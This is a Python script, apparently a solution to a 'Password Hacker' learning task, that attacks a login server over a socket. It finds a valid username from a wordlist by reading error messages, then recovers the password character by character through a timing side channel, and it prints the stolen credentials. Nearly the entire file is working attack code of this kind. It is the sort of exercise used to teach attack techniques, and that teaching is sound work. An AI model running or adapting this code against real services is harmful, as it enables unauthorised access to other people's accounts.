import argparse
import socket
import json
import string
import sys
from time import time

parser = argparse.ArgumentParser()
parser.add_argument('server_ip', type=str, help='IP used to connect to the server socket')
parser.add_argument('port', type=int)


args = parser.parse_args()

def hacking():
    global letter_number
    for i in characters:
        p_guess = json.dumps({'login': correct_login, 'password': ''.join(password) + str(i)}).encode()
        start = time()
        MySocket.send(p_guess)
        p_response = MySocket.recv(1024).decode()
        p_response = json.loads(p_response)
        end = time()
        time_difference = (end - start)
        result = p_response.get('result')
        if time_difference > 0.1:
            password.append(i)
            letter_number += 1
            hacking()
        elif result == 'Connection success!':
            password.append(i)
            print(json.dumps({'login': correct_login, 'password': ''.join(password)}))
            sys.exit()

with open('D:\\Password Hacker (Python)\\Password Hacker (Python)\\task\\hacking\\logins.txt', 'r') as l_file:
    logins = list(l_file.readlines())
    dictionary = [({'login': words.rstrip(), 'password': ' '}) for i, words in enumerate(logins)]

with socket.socket() as MySocket:
    address = (args.server_ip, args.port)
    MySocket.connect(address)

    for n, i in enumerate(dictionary):
        guess = json.dumps(dictionary[n]).encode()

        MySocket.send(guess)
        response = MySocket.recv(1024)
        response = response.decode()
        response = json.loads(response)
        result = response.get('result')
        if result == 'Wrong password!':
            correct_login = dictionary[n].get('login')

    password = []
    characters = string.ascii_letters + string.digits
    letter_number = 0
    hacking()











